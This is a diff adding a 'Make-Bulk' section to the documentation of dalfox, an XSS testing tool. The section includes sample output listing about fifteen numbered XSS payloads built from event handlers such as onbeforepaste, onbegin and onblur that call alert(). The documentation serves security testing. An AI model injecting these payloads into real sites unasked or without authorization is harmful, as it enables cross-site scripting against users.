@@ -14,6 +14,32 @@ e.g
 ▶ dalfox payload --enum-injs --entity-event-handler"
 ```
 
+## Make-Bulk
+Make-bulk generates many xss payloads. At this point, the parameters of the alert are configured as sequence and it is easy to find which payload was triggered during the XSS test.
+```
+▶ dalfox payload --make-bulk
+```
+output
+```
+...snip...
+<track onbeforepaste=\"alert(488)\" contenteditable>test<\/track>
+<tt onbeforepaste=\"alert(489)\" contenteditable>test<\/tt>
+<u onbeforepaste=\"alert(490)\" contenteditable>test<\/u>
+<ul onbeforepaste=\"alert(491)\" contenteditable>test<\/ul>
+<var onbeforepaste=\"alert(492)\" contenteditable>test<\/var>
+<video onbeforepaste=\"alert(493)\" contenteditable>test<\/video>
+<wbr onbeforepaste=\"alert(494)\" contenteditable>test<\/wbr>
+<xmp onbeforepaste=\"alert(495)\" contenteditable>test<\/xmp>
+<body onbeforeprint=alert(496)>
+<svg><path><animateMotion onbegin=alert(497) dur=\"1s\" repeatCount=\"1\">
+<svg><animatetransform onbegin=alert(498) attributeName=transform>
+<svg><set onbegin=alert(499) attributename=x dur=1s>
+<svg><animate onbegin=alert(500) attributeName=x dur=1s>
+<input onblur=alert(501) id=x><input autofocus>
+<textarea onblur=alert(502) id=x><\/textarea><input autofocus>
+...snip...
+```
+
 ## Encoder
 ```
 --encoder-url            Encoding output [URL]
